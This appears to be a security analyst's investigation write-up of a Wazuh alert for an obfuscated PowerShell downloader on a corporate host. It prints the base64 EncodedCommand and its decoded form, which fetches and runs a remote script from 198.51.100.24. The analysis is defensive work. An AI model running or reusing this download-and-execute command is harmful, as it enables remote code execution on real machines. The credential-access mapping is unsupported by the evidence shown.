# Suspicious Encoded PowerShell Execution Investigation

## Alert

Source: Wazuh / Sysmon

Rule ID: 34012  
Description: Suspicious PowerShell execution with EncodedCommand

Severity: High

---

## Host Information

Hostname: VICTIM-HOST-01.corp.local  
Agent ID: vh01  
Internal IP: 10.10.5.23

User executing process:

CORP\svc-update

---

## Log Evidence

Relevant fields extracted from the alert:

Process:

C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

Command executed:

-NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand SUVYIChOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnaHR0cDovLzE5OC41MS4xMDAuMjQvZGVmZW5kZXIvZGVwbG95LWRlZmluaXRpb25zLnBzMScpOyBTdGFydC1Qcm9jZXNzIHBvd2Vyc2hlbGwgLUFyZ3VtZW50TGlzdCAnLU5vUHJvZmlsZSAtV2luZG93U3R5bGUgSGlkZGVuIC1GaWxlIEM6XFdpbmRvd3NcVGVtcFxkZXBsb3ktZGVmaW5pdGlvbnMucHMxJw==

Suspicious indicators:

- EncodedCommand
- ExecutionPolicy Bypass
- Hidden window execution

---

## Step 1 — Decode the payload

Command used:

echo "SUVYIChOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50KS..." | base64 -d

Decoded PowerShell:

IEX (New-Object System.Net.WebClient).DownloadString('http://198.51.100.24/defender/deploy-definitions.ps1');
Start-Process powershell -ArgumentList '-NoProfile -WindowStyle Hidden -File C:\Windows\Temp\deploy-definitions.ps1'

---

## Step 2 — Indicators of Compromise

Identified indicators:

C2 IP:

198.51.100.24

Downloaded script:

deploy-definitions.ps1

---

## Step 3 — Threat Intelligence (VirusTotal)

IOC investigated:

198.51.100.24

VirusTotal findings:

- Associated malware sample: MangoJava.exe
- Infrastructure linked to malicious downloader activity
- IP observed hosting malicious PowerShell scripts

Threat classification:

Likely C2 infrastructure used for payload delivery.

---

## Step 4 — MITRE ATT&CK Mapping

Execution

T1059.001 — PowerShell

Command & Control

T1105 — Ingress Tool Transfer

Credential Access

T1555 — Credentials from Password Stores

---

## Conclusion

The alert corresponds to an obfuscated PowerShell downloader executed on host:

VICTIM-HOST-01

The encoded payload retrieves a remote script from:

198.51.100.24

Threat intelligence confirms that the infrastructure has been associated with malware distribution, including the sample MangoJava.exe.

The activity indicates likely compromise or malicious automation executed under the account:

CORP\svc-update
